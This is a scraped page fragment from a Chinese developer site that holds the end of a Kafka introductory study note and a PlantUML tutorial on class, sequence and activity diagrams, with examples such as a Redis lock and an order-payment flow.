itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GoPilot"/> <meta itemprop="url" content="https://juejin.cn/user/4427068031123036"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kafka学习笔记系列——小试牛刀
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4427068031123036/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GoPilot
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:44:34.000Z" title="Fri Jan 02 2026 07:44:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">kafka是什么？</h2>
<p>一句话概括：Apache Kafka 是一款开源的分布式消息引擎系统，使用纯二进制的字节序列来传输消息，支持点对点模型（如客服电话）、发布/订阅模型（如报纸订阅）。</p>
<pre><code class="hljs">   引擎：具备某种能量转换传输的能力； 
   消息引擎：将上游的巨大能力平稳的输出到下游 
   
   消息系统：不是很恰当，它片面强调了消息主体的作用，而忽视了这类系统引以为豪的消息传递属
</code></pre>
<p>最基础的消息引擎：系统 A 发送消息给消息引擎系统，系统 B 从消息引擎系统中读取 A 发送的消息。</p>
<p>既然消息引擎是用于在不同系统之间传输消息的，那么如何设计待传输消息的格式从来都是一等一的大事。试问一条消息如何做到信息表达业务语义而无歧义，同时它还要能最大限度地提供可重用性以及通用性？</p>
<p>kafka中消息还是结构化的，只是在使用之前都要将其转换成二进制的字节序列。</p>
<p>常见的两种消息传输方法：</p>
<ol>
<li>点对点模型：也叫消息队列模型。系统 A 发送的消息只能被系统 B 接收，其他任何系统都不能读取 A 发送的消息。日常生活的例子比如电话客服就属于这种模型：同一个客户呼入电话只能被一位客服人员处理，第二个客服人员不能为该客户服务。</li>
<li>发布/订阅模型：有一个主题（Topic）的概念，你可以理解成逻辑语义相近的消息容器。该模型也有发送方和接收方，向主题发布消息的客户端应用程序称为生产者（Producer），生产者程序通常持续不断地向一个或多个主题发送消息，而订阅这些主题消息的客户端应用程序就被称为消费者（Consumer）。消费者也能够同时订阅多个主题的消息。
发送方也称为发布者（Publisher），接收方称为订阅者（Subscriber）。和点对点模型不同的是，这个模型可能存在多个发布者向相同的主题发送消息，而订阅者也可能存在多个，它们都能接收到相同主题的消息。生活中的报纸订阅就是一种典型的发布 / 订阅模型。</li>
</ol>
<p>kafka支持上述两种模型。</p>
<p>我们把生产者和消费者统称为客户端（Clients）。可以同时运行多个生产者和消费者实例，这些实例会不断地向 Kafka 集群中的多个主题生产和消费消息。</p>
<p>有客户端自然也就有服务器端。Kafka 的服务器端由被称为 Broker 的服务进程构成，即一个 Kafka 集群由多个 Broker 组成，Broker 负责接收和处理客户端发送过来的请求，以及对消息进行持久化。</p>
<p>虽然多个 Broker 进程能够运行在同一台机器上，但更常见的做法是将不同的 Broker 分散运行在不同的机器上，这样如果集群中某一台机器宕机，即使在它上面运行的所有 Broker 进程都挂掉了，其他机器上的 Broker 也依然能够对外提供服务。这其实就是 Kafka 提供高可用的手段之一。</p>
<h2 data-id="heading-1">为什么需要消息引擎系统？</h2>
<p>答案就是“<strong>削峰填谷</strong>”，上下游（由于业务性质的不同所导致的）处理速度不匹配，所以需要消息队列来做缓冲。</p>
<p>所谓的“削峰填谷”就是指缓冲上下游瞬时突发流量，使其更平滑。特别是对于那种发送能力很强的上游系统，如果没有消息引擎的保护，“脆弱”的下游系统可能会直接被压垮导致全链路服务“雪崩”。但是，一旦有了消息引擎，它能够有效地对抗上游的流量冲击，真正做到将上游的“峰”填满到“谷”中，避免了流量的震荡。</p>
<p>消息引擎系统的另一大好处在于发送方和接收方的松耦合，这也在一定程度上简化了应用的开发，减少了系统间不必要的交互。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74d7c33fdee447c58269a0dccb25385f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR29QaWxvdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944674&amp;x-signature=l2UBblcGI1GbyL9arqOOS7Xf8RA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uml图详细介绍]]></title>    <link>https://juejin.cn/post/7590071125398274088</link>    <guid>https://juejin.cn/post/7590071125398274088</guid>    <pubDate>2026-01-02T07:51:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398274088" data-draft-id="7590071125398241320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uml图详细介绍"/> <meta itemprop="keywords" content="UML"/> <meta itemprop="datePublished" content="2026-01-02T07:51:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uml图详细介绍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:51:21.000Z" title="Fri Jan 02 2026 07:51:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>下面用「<strong>一张速查表 + 大量可运行案例</strong>」把 UML 里<strong>最常用</strong>的三张图（类图 / 时序图 / 活动图）彻底讲透。<br/>
每个案例都给出 <strong>PlantUML 源码</strong>，复制→粘贴到<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.planttext.com%2F" target="_blank" title="https://www.planttext.com/" ref="nofollow noopener noreferrer">www.planttext.com/</a> 即可秒出高清矢量图，也能直接嵌入 Markdown / Confluence / PPT。</p>
<hr/>
<h2 data-id="heading-0">一、速查表：3 张图各自解决什么问题？</h2>





























<table><thead><tr><th>图类型</th><th>回答的问题</th><th>核心元素</th><th>记忆口诀</th></tr></thead><tbody><tr><td><strong>类图</strong>（Class Diagram）</td><td>系统「<strong>长什么样</strong>」：有哪些类？各自职责？类之间怎么协作？</td><td>类=三层方框（名字-属性-方法）+ 五种关系线</td><td><strong>“静态骨架”</strong></td></tr><tr><td><strong>时序图</strong>（Sequence Diagram）</td><td>对象之间「<strong>先说什么、后说什么</strong>」：消息按时间顺序怎么流动？</td><td>生命线+箭头调用+激活条</td><td><strong>“动态对话”</strong></td></tr><tr><td><strong>活动图</strong>（Activity Diagram）</td><td>业务流程「<strong>怎么走</strong>」：if/else、并发、循环、异常怎么流转？</td><td>圆角动作+菱形分支+黑棒同步</td><td><strong>“流程地图”</strong></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">二、类图：静态骨架（7 个案例）</h2>
<ol>
<li>类的“长什么样”——三层方框</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class Student {
    -id: Long
    -name: String
    +study()
}
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63cde74969db4f8bac89c4662432db87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=k%2F7BZPt3IknSqaB2KyGgQHSmT4E%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>关联关系：一对一 / 一对多 / 多对多</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class Order {}
class OrderItem {}
class Product {}
Order "1" --&gt; "*" OrderItem : contains
OrderItem "*" --&gt; "1" Product : refers
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/933c695687e04458ae0ca66c1f56e4c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=YLtucLdOJcBgjBXZqunvUQPb8rk%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>聚合 VS 组合：生命周期强弱</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class Car {}
class Engine {}
class Wheel {}

Car o-- Engine : 聚合（车报废引擎可再用）
Car *-- "4" Wheel : 组合（车销毁轮子也销毁）
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f1355c5220f40ecbfb7c28a205e702d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=e0LJGt1exWU%2FD4T4i8T%2BhbadCb0%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>继承（泛化）（支付渠道例子）</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
abstract Payment {
    +pay()
}
Payment &lt;|-- Alipay
Payment &lt;|-- WechatPay
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22d5eb7397ff437ca1012509af19011d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=D6zK0M8vQi72FwRYG7ZeDW5VB14%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>实现接口（Java 8 默认方法同理）</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
interface Flyable {
    +fly()
}
class Bird {}
Flyable &lt;|.. Bird : 实现
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b7ef95b4d204ce6b9183e401ba55314~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=HEr%2FkoSDU87SIwtgC8TTbZnYANI%3D" alt="image.png" loading="lazy"/></p>
<ol start="6">
<li>设计模式：策略模式类图</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
interface DiscountStrategy {
    +calc(price: BigDecimal): BigDecimal
}
DiscountStrategy &lt;|-- VipStrategy
DiscountStrategy &lt;|-- CouponStrategy
class OrderContext {
    -strategy: DiscountStrategy
    +execute(price: BigDecimal)
}
OrderContext --&gt; DiscountStrategy : 使用
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/728f1ea6a07a438e8016577fe13fb49b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=yATaO3v3dZ79hlSR2Szsq4%2B9nR8%3D" alt="image.png" loading="lazy"/></p>
<ol start="7">
<li>SpringBoot 三层架构（Controller→Service→DAO）</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class UserController {}
interface UserService {}
class UserServiceImpl {}
interface UserRepository {}
class UserRepositoryImpl {}

UserController --&gt; UserService
UserService &lt;|.. UserServiceImpl
UserServiceImpl --&gt; UserRepository
UserRepository &lt;|.. UserRepositoryImpl
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1338039b8b534afdbb9ce13c5e57cff0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=1%2F%2F2KjzF%2FE%2FslrbW9URQGK7osO8%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">三、时序图：动态对话（6 个案例）</h2>
<ol>
<li>基础语法：生命线+调用箭头+返回虚线</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor Alice
participant Bob
Alice -&gt; Bob: hello()
Bob --&gt; Alice: ok
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85808222eb994167a3f197a38b9b5389~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=GpwDAwFL6YftVuAFpYCeSVvTtxA%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>循环与条件（登录重试 3 次）</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor 用户
participant 前端
loop 3 times
    用户 -&gt; 前端: 输入密码
    alt 密码正确
        前端 --&gt; 用户: 登录成功
        break
    else 密码错误
        前端 --&gt; 用户: 提示重输
    end
end
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b841296f82f422898f551be5d3e4704~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=7Hf5KfDP%2B6xNb67waFVvStD0MQU%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>异步消息（AJAX 回调）</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor 浏览器
participant 前端JS
participant 后端
browser -&gt; 前端JS: 点击提交
前端JS -&gt; 后端: POST /api/async
前端JS --&gt; browser: 立即显示“处理中”
后端 -&gt; 前端JS: 回调结果
前端JS -&gt; browser: 更新页面
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7b23a5870d04b02b173eb24418e1321~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=g8Z%2FTvX7%2BtjY3Yjrgc%2BSqsdmSc0%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>Redis 分布式锁完整生命周期</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor 线程
participant Redis
participant MySQL

线程 -&gt; Redis: SET lock uuid NX EX 30
alt 返回 OK
    线程 -&gt; MySQL: SELECT ... FOR UPDATE
    线程 -&gt; MySQL: UPDATE ...
    线程 -&gt; Redis: DEL lock
else 返回 nil
    线程 -&gt; 线程: sleep(0.1)
    线程 -&gt; Redis: 重试
end
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a1935ef553942d59548070f39b6184b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=V2rV6JSzpS5lzO%2FYiU6pbSw9XR8%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>微服务 Feign 调用链（含熔断）</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor 用户
participant OrderService
participant StockService
participant Hystrix

OrderService -&gt; Hystrix: 扣库存()
Hystrix -&gt; StockService: POST /stock/reduce
alt 成功
    StockService --&gt; Hystrix: 200
else 失败 / 超时
    Hystrix --&gt; OrderService: 熔断返回fallback
end
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4424bc7f4e9943098069025460f4f038~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=RTFmE5SiBNapw6FEC4JD5soZneM%3D" alt="image.png" loading="lazy"/></p>
<ol start="6">
<li>下单→支付→履约 全流程（跨 4 个域）</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor 用户
boundary 网关
control 订单中心
control 支付中心
database MySQL
queue 消息队列
control 库存中心

用户 -&gt; 网关: POST /order
网关 -&gt; 订单中心: createOrder()
订单中心 -&gt; MySQL: insert
订单中心 -&gt; 支付中心: createPayment()
支付中心 -&gt; MySQL: insert
支付中心 -&gt; 消息队列: PaymentSuccess事件
消息队列 -&gt; 库存中心: 扣库存
库存中心 -&gt; MySQL: update stock
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e05fcdf8f694743b75656836480ddd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=9j5crj%2FeoLFEEbspsQTIEZWqwMM%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-3">四、活动图：流程地图（5 个案例）</h2>
<ol>
<li>基本分支：电商下单</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
:创建订单;
if (库存充足?) then (yes)
    :扣库存;
    :支付;
    if (支付成功?) then (yes)
        :发货;
        :完成;
    else (no)
        :取消订单;
        :恢复库存;
    endif
else (no)
    :提示缺货;
endif
stop
@enduml
</code></pre>
